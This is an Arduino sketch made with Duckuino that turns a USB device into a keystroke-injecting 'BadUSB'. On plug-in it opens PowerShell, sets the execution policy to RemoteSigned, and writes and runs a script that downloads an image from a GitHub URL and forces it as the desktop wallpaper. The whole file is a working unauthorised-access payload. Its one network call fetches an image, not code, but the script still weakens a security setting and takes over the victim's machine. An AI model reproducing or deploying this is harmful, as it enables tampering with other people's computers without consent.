/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // ChangeWallpaper
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(2000);
  Keyboard.print(F("powershell"));

  typeKey(KEY_RETURN);

  delay(5000);
  Keyboard.print(F("set-executionpolicy -Scope CurrentUser remotesigned"));

  typeKey(KEY_RETURN);

  delay(2000);
  Keyboard.print(F("y"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("echo \"wget -Uri https://github.com/MeditationDuck/badusb/blob/main/image.jpg?raw=true -outfile $env:USERPROFILE\\image.jpg"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("Set-ItemProperty -path `\"HKCU:Control Panel\\Desktop`\" -name wallpaper -value $env:USERPROFILE\\image.jpg"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("rm $env:USERPROFILE\\image.jpg\" >> change.ps1"));

  typeKey(KEY_RETURN);

  delay(2000);
  Keyboard.print(F(".\\change.ps1"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}